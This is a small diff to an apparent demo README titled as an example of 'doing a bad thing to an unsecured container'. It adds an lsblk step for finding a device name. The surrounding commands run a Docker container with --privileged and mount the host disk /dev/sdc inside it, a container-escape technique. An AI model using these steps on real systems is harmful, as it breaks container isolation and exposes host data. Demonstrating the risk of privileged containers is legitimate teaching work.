@@ -6,6 +6,7 @@ An exmaple of doing a bad thing to an unsecured container.
 
 ```shell
 cd ~/git/privileged
+lsblk -io KNAME,TYPE,SIZE,MODEL # to find device name
 docker build -t privileged:latest .
 docker run --rm -it --privileged privileged:latest bash
 mount /dev/sdc /mnt/gotcha
